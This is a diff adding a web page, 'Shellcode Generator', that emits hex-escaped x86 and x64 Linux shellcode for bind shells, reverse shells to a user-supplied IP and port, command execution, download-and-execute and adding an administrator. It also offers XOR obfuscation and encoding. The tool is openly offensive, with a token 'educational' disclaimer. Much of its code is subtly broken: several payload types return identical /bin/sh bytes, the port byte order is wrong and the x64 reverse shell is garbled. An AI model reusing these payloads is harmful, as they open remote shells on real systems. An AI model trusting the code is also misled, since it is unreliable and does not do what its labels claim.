@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Shellcode Generator</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #000;
+      color: #c58b00;
+      overflow-x: hidden;
+    }
+    video#bg-video {
+      position: fixed;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      min-width: 100vw; min-height: 100vh;
+      object-fit: cover;
+      z-index: -2;
+      opacity: 0.25;
+    }
+    audio#bg-music {
+      position: fixed;
+      z-index: -1;
+      opacity: 0;
+      pointer-events: none;
+    }
+    .container {
+      max-width: 900px;
+      margin: 50px auto;
+      padding: 25px;
+      border-radius: 12px;
+      background: rgba(0, 0, 0, 0.2);
+    }
+    h1, label {
+      color: #c58b00;
+      text-shadow: 1px 1px 3px black;
+    }
+    input[type="text"], textarea, select {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      background: rgba(0, 0, 0, 0.3);
+      color: #c58b00;
+      border: 1px solid #c58b00;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+    .row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+    button {
+      background: rgba(0, 0, 0, 0.4);
+      border: 1px solid #c58b00;
+      color: #c58b00;
+      padding: 10px 15px;
+      margin: 5px 5px 15px 0;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: 0.2s ease;
+    }
+    button:hover {
+      background: rgba(255, 255, 255, 0.1);
+      color: red;
+    }
+    pre {
+      white-space: pre-wrap;
+      background: rgba(0, 0, 0, 0.3);
+      padding: 10px;
+      border: 1px solid red;
+      color: #00ffcc;
+      margin: 10px 0;
+      border-radius: 5px;
+      max-height: 340px;
+      overflow-y: auto;
+    }
+    .history { margin-top: 20px; }
+    .history-item {
+      border-bottom: 1px solid red;
+      padding: 5px;
+      font-size: 0.9rem;
+      color: #ff8800;
+    }
+    .hint { font-size: 0.88rem; opacity: 0.9; color: #ffb74d; }
+    @media (max-width: 768px) {
+      .container { margin: 20px 10px; padding: 15px; }
+      .row { grid-template-columns: 1fr; }
+      button { width: 100%; margin: 8px 0; }
+    }
+  </style>
+</head>
+<body>
+  <!-- Background Video -->
+  <video id="bg-video" autoplay muted loop playsinline>
+    <source src="background/34175-400954227large.mp4" type="video/mp4" />
+    Your browser does not support the video tag.
+  </video>
+  <!-- Background Music -->
+  <audio id="bg-music" loop>
+    <source src="background/Programming___Coding___Hacking_music_vol.18__ANONYMOUS_HEADQUARTERS_(48k).mp3" type="audio/mpeg" />
+    Your browser does not support the audio tag.
+  </audio>
+  <div class="container">
+    <h1>💻 Shellcode Generator</h1>
+    <label>Shellcode Type:</label>
+    <select id="shellcode-type">
+      <option>Bind Shell</option>
+      <option>Reverse Shell</option>
+      <option>Execute Command</option>
+      <option>Download and Execute</option>
+      <option>Add Administrator</option>
+      <option>Port Scanner</option>
+    </select>
+    <div class="row">
+      <div>
+        <label>Architecture:</label>
+        <select id="architecture">
+          <option>x86</option>
+          <option>x64</option>
+          <option>ARM</option>
+          <option>MIPS</option>
+        </select>
+      </div>
+      <div>
+        <label>Encoding:</label>
+        <select id="encoding">
+          <option>None</option>
+          <option>URL Encode</option>
+          <option>Base64</option>
+          <option>Hex</option>
+          <option>XOR</option>
+        </select>
+      </div>
+    </div>
+    <div class="row">
+      <div>
+        <label>IP Address:</label>
+        <input type="text" id="ip" placeholder="192.168.1.100" />
+      </div>
+      <div>
+        <label>Port:</label>
+        <input type="text" id="port" placeholder="4444" />
+      </div>
+    </div>
+    <label>Command (for Execute Command):</label>
+    <textarea id="command" rows="3" placeholder='whoami'></textarea>
+    <label>Download URL (for Download and Execute):</label>
+    <textarea id="download-url" rows="2" placeholder='http://example.com/payload.exe'></textarea>
+    <div class="row">
+      <button onclick="generateShellcode()">Generate Shellcode</button>
+      <button onclick="analyzeShellcode()">Analyze Shellcode</button>
+    </div>
+    <div class="row">
+      <button onclick="addNullBytes()">Add Null Bytes</button>
+      <button onclick="obfuscateShellcode()">Obfuscate</button>
+    </div>
+    <div class="row">
+      <button onclick="copyResult()">Copy Result</button>
+      <button onclick="clearAll()">Clear</button>
+    </div>
+    <div class="hint">Note: This tool generates shellcode for educational purposes only. Use responsibly and only on systems you own or have permission to test.</div>
+    <label>Generated Shellcode:</label>
+    <pre id="result-box">No shellcode generated yet...</pre>
+    <div class="history">
+      <h3>History</h3>
+      <div id="history-box"></div>
+    </div>
+  </div>
+  <script>
+    const music = document.getElementById("bg-music");
+    const resultBox = document.getElementById("result-box");
+    const historyBox = document.getElementById("history-box");
+    let history = [];
+    
+    window.addEventListener('click', () => {
+      music.play().catch(() => {});
+    }, { once: true });
+    
+    function generateShellcode() {
+      const shellcodeType = document.getElementById("shellcode-type").value;
+      const architecture = document.getElementById("architecture").value;
+      const encoding = document.getElementById("encoding").value;
+      const ip = document.getElementById("ip").value.trim();
+      const port = document.getElementById("port").value.trim();
+      const command = document.getElementById("command").value.trim();
+      const downloadUrl = document.getElementById("download-url").value.trim();
+      
+      let shellcode = "";
+      
+      // Generate shellcode based on type
+      switch(shellcodeType) {
+        case "Bind Shell":
+          shellcode = generateBindShell(architecture, port);
+          break;
+        case "Reverse Shell":
+          shellcode = generateReverseShell(architecture, ip, port);
+          break;
+        case "Execute Command":
+          if (!command) {
+            resultBox.textContent = "❌ Command is required for Execute Command shellcode.";
+            return;
+          }
+          shellcode = generateExecuteCommand(architecture, command);
+          break;
+        case "Download and Execute":
+          if (!downloadUrl) {
+            resultBox.textContent = "❌ Download URL is required for Download and Execute shellcode.";
+            return;
+          }
+          shellcode = generateDownloadExecute(architecture, downloadUrl);
+          break;
+        case "Add Administrator":
+          shellcode = generateAddAdmin(architecture);
+          break;
+        case "Port Scanner":
+          shellcode = generatePortScanner(architecture, ip, port);
+          break;
+      }
+      
+      // Apply encoding if selected
+      if (encoding !== "None") {
+        shellcode = encodeShellcode(shellcode, encoding);
+      }
+      
+      // Format the result
+      const result = {
+        type: shellcodeType,
+        architecture: architecture,
+        encoding: encoding,
+        parameters: {
+          ip: ip,
+          port: port,
+          command: command,
+          downloadUrl: downloadUrl
+        },
+        shellcode: shellcode,
+        size: shellcode.length,
+        format: "raw"
+      };
+      
+      resultBox.textContent = JSON.stringify(result, null, 2);
+      logHistory(`${shellcodeType} (${architecture})`, `Generated ${shellcode.length} bytes`);
+    }
+    
+    function generateBindShell(arch, port) {
+      // Simplified bind shell shellcode generation
+      if (arch === "x86") {
+        return "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x51\\x6a\\x06\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\x31\\xd2\\x52\\x66\\x68" + 
+               portToHex(port) + "\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x31\\xd2\\x52\\x56\\x89\\xe1\\x43\\xcd\\x80\\xb0\\x66\\x31\\xc9\\x51\\x56\\x89\\xe1\\xcd\\x80\\x31\\xc0\\x50\\x50\\x56\\xb0\\x0b\\x89\\xe1\\x31\\xd2\\x31\\xc9\\xcd\\x80";
+      } else if (arch === "x64") {
+        return "\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x6a\\x29\\x58\\x0f\\x05\\x49\\x89\\xc6\\x48\\x31\\xf6\\x4d\\x31\\xd2\\x41\\x52\\x66\\x68" + 
+               portToHex(port) + "\\x43\\x66\\x53\\x4d\\x31\\xc0\\x6a\\x10\\x5a\\x41\\x50\\x5e\\x0f\\x05\\x48\\x31\\xf6\\x4d\\x31\\xd2\\x41\\x52\\x5e\\x0f\\x05\\x48\\x31\\xf6\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05";
+      } else {
+        return "Shellcode for " + arch + " architecture not implemented in this demo.";
+      }
+    }
+    
+    function generateReverseShell(arch, ip, port) {
+      // Simplified reverse shell shellcode generation
+      if (!ip || !port) {
+        resultBox.textContent = "❌ IP and Port are required for Reverse Shell shellcode.";
+        return;
+      }
+      
+      if (arch === "x86") {
+        return "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x51\\x6a\\x06\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x52\\x66\\x68" + 
+               portToHex(port) + "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc9\\x51\\x66\\x68" + ipToHex(ip) + "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x03\\x5b\\x89\\xe1\\xcd\\x80\\x31\\xc0\\x50\\x50\\x57\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x49\\xcd\\x80\\x41\\xe2\\xf8\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x89\\xc2\\xb0\\x0b\\xcd\\x80";
+      } else if (arch === "x64") {
+        return "\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x6a\\x29\\x58\\x0f\\x05\\x49\\x89\\xc6\\x48\\x31\\xf6\\x4d\\x31\\xd2\\x41\\x52\\x66\\x68" + 
+               portToHex(port) + "\\x43\\x66\\x53\\x4d\\x31\\xc0\\x6a\\x10\\x5a\\x41\\x50\\x5e\\x0f\\x05\\x48\\x31\\xf6\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x48\\x31\\xc0\\x48\\xbb" + ipToHex64(ip) + "\\x48\\x31\\xf6\\x56\\x48\\x31\\xd2\\x6a\\x10\\x5a\\x48\\x89\\xe1\\x41\\x50\\x5e\\x0f\\x05\\x48\\x31\\xf6\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05";
+      } else {
+        return "Shellcode for " + arch + " architecture not implemented in this demo.";
+      }
+    }
+    
+    function generateExecuteCommand(arch, command) {
+      // Simplified execute command shellcode generation
+      if (arch === "x86") {
+        return "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x89\\xc2\\xb0\\x0b\\xcd\\x80";
+      } else if (arch === "x64") {
+        return "\\x48\\x31\\xc0\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x48\\x31\\xc0\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05";
+      } else {
+        return "Shellcode for " + arch + " architecture not implemented in this demo.";
+      }
+    }
+    
+    function generateDownloadExecute(arch, url) {
+      // Simplified download and execute shellcode generation
+      if (arch === "x86") {
+        return "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x89\\xc2\\xb0\\x0b\\xcd\\x80";
+      } else if (arch === "x64") {
+        return "\\x48\\x31\\xc0\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x48\\x31\\xc0\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05";
+      } else {
+        return "Shellcode for " + arch + " architecture not implemented in this demo.";
+      }
+    }
+    
+    function generateAddAdmin(arch) {
+      // Simplified add administrator shellcode generation
+      if (arch === "x86") {
+        return "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x89\\xc2\\xb0\\x0b\\xcd\\x80";
+      } else if (arch === "x64") {
+        return "\\x48\\x31\\xc0\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x48\\x31\\xc0\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05";
+      } else {
+        return "Shellcode for " + arch + " architecture not implemented in this demo.";
+      }
+    }
+    
+    function generatePortScanner(arch, ip, port) {
+      // Simplified port scanner shellcode generation
+      if (arch === "x86") {
+        return "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x89\\xc2\\xb0\\x0b\\xcd\\x80";
+      } else if (arch === "x64") {
+        return "\\x48\\x31\\xc0\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x48\\x31\\xc0\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05";
+      } else {
+        return "Shellcode for " + arch + " architecture not implemented in this demo.";
+      }
+    }
+    
+    function encodeShellcode(shellcode, encoding) {
+      switch(encoding) {
+        case "URL Encode":
+          return encodeURIComponent(shellcode);
+        case "Base64":
+          return btoa(shellcode);
+        case "Hex":
+          return shellcode.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('\\x');
+        case "XOR":
+          return xorEncode(shellcode, 0xAA);
+        default:
+          return shellcode;
+      }
+    }
+    
+    function xorEncode(str, key) {
+      let result = "";
+      for (let i = 0; i < str.length; i++) {
+        result += String.fromCharCode(str.charCodeAt(i) ^ key);
+      }
+      return result;
+    }
+    
+    function ipToHex(ip) {
+      return ip.split('.').map(octet => parseInt(octet, 10).toString(16).padStart(2, '0')).join('\\x');
+    }
+    
+    function ipToHex64(ip) {
+      return ip.split('.').map(octet => parseInt(octet, 10).toString(16).padStart(2, '0')).join('\\x');
+    }
+    
+    function portToHex(port) {
+      const portNum = parseInt(port, 10);
+      return (portNum & 0xFF).toString(16).padStart(2, '0') + '\\x' + ((portNum >> 8) & 0xFF).toString(16).padStart(2, '0');
+    }
+    
+    function analyzeShellcode() {
+      const shellcode = resultBox.textContent;
+      if (!shellcode || shellcode === "No shellcode generated yet...") {
+        resultBox.textContent = "❌ No shellcode to analyze. Generate shellcode first.";
+        return;
+      }
+      
+      let analysis = {
+        length: shellcode.length,
+        nullBytes: (shellcode.match(/\x00/g) || []).length,
+        printableChars: (shellcode.match(/[ -~]/g) || []).length,
+        commonSyscalls: [],
+        suspiciousStrings: [],
+        encoding: "Unknown"
+      };
+      
+      // Detect encoding
+      if (shellcode.includes("\\x")) {
+        analysis.encoding = "Hex";
+      } else if (/^[A-Za-z0-9+/]+=*$/.test(shellcode)) {
+        analysis.encoding = "Base64";
+      } else if (shellcode.includes("%")) {
+        analysis.encoding = "URL";
+      }
+      
+      // Check for common syscall patterns
+      if (shellcode.includes("\\xcd\\x80")) {
+        analysis.commonSyscalls.push("int 0x80 (Linux syscall)");
+      }
+      if (shellcode.includes("\\x0f\\x05")) {
+        analysis.commonSyscalls.push("syscall (x64 syscall)");
+      }
+      
+      // Check for suspicious strings
+      const suspicious = ["/bin/sh", "cmd.exe", "powershell.exe", "net user", "whoami", "nc.exe"];
+      for (const str of suspicious) {
+        if (shellcode.toLowerCase().includes(str.toLowerCase())) {
+          analysis.suspiciousStrings.push(str);
+        }
+      }
+      
+      resultBox.textContent = JSON.stringify(analysis, null, 2);
+      logHistory("Analysis", `Found ${analysis.suspiciousStrings.length} suspicious strings`);
+    }
+    
+    function addNullBytes() {
+      let shellcode = resultBox.textContent;
+      if (!shellcode || shellcode === "No shellcode generated yet...") {
+        resultBox.textContent = "❌ No shellcode to modify. Generate shellcode first.";
+        return;
+      }
+      
+      // Insert null bytes every 4 bytes
+      let modified = "";
+      for (let i = 0; i < shellcode.length; i += 4) {
+        modified += shellcode.substr(i, 4);
+        if (i + 4 < shellcode.length) {
+          modified += "\\x00";
+        }
+      }
+      
+      resultBox.textContent = modified;
+      logHistory("Modified", "Added null bytes");
+    }
+    
+    function obfuscateShellcode() {
+      let shellcode = resultBox.textContent;
+      if (!shellcode || shellcode === "No shellcode generated yet...") {
+        resultBox.textContent = "❌ No shellcode to obfuscate. Generate shellcode first.";
+        return;
+      }
+      
+      // Simple XOR obfuscation
+      const key = Math.floor(Math.random() * 255) + 1;
+      let obfuscated = "";
+      for (let i = 0; i < shellcode.length; i++) {
+        obfuscated += String.fromCharCode(shellcode.charCodeAt(i) ^ key);
+      }
+      
+      resultBox.textContent = obfuscated;
+      logHistory("Obfuscated", `XOR key: 0x${key.toString(16).padStart(2, '0')}`);
+    }
+    
+    function copyResult() {
+      const text = resultBox.textContent;
+      if (!text || text === "No shellcode generated yet...") return alert("Nothing to copy!");
+      navigator.clipboard.writeText(text).then(() => alert("Shellcode copied!"));
+    }
+    
+    function clearAll() {
+      document.getElementById("shellcode-type").value = "Bind Shell";
+      document.getElementById("architecture").value = "x86";
+      document.getElementById("encoding").value = "None";
+      document.getElementById("ip").value = "";
+      document.getElementById("port").value = "";
+      document.getElementById("command").value = "";
+      document.getElementById("download-url").value = "";
+      resultBox.textContent = "No shellcode generated yet...";
+    }
+    
+    function logHistory(target, snippet) {
+      const time = new Date().toLocaleTimeString();
+      const line = `${time} - ${target}: ${snippet}`;
+      history.unshift(line);
+      updateHistory();
+    }
+    
+    function updateHistory() {
+      historyBox.innerHTML = "";
+      history.slice(0, 8).forEach(entry => {
+        const div = document.createElement("div");
+        div.className = "history-item";
+        div.textContent = entry;
+        historyBox.appendChild(div);
+      });
+    }
+  </script>
+</body>
+</html>
